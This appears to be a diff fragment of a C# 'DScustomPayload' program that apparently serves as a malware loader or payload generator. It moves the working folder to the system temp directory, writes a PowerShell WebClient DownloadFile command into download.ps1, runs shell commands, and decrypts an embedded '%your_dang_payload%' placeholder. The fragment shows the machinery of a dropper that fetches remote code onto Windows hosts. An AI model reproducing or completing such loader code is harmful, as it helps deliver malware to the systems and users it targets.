@@ -64,8 +64,8 @@ namespace DScustomPayload
         }
 		public static void Download(string url, string outPath)
 		{
-			// string tempdir = Path.GetTempPath();
-			string tempdir = "./";
+			string tempdir = Path.GetTempPath();
+			// string tempdir = "./";
 			
 			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
 			
@@ -76,7 +76,7 @@ namespace DScustomPayload
 			
 			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
 			
-			outPath = tempdir + "/download.ps1";
+			outPath = tempdir + "\\download.ps1";
 			
             // open or create file
             FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
@@ -84,7 +84,7 @@ namespace DScustomPayload
             StreamWriter streamwrite = new StreamWriter(streamfile);
             // add some lines
 			
-			outPath = '"' + tempdir + "/download.ps1" + '"';
+			outPath = '"' + tempdir + "\\download.ps1" + '"';
 			
 			
 			// string powershelldownloadtxt = "" + url +"\  "
@@ -325,11 +325,10 @@ namespace DScustomPayload
 		}
 		static void Main(string[] args)
         {
-			string encDANGpayload = encrypt("this is a new message 123 $");
+			string encDANGpayload = @"%your_dang_payload%";
 			
-			Console.WriteLine("enc: "+encrypt("this is a new message 123 $"));
 			Console.WriteLine("dec: "+decrypt(encDANGpayload));
-			
+			Console.Read();
 		}
 	}
 }
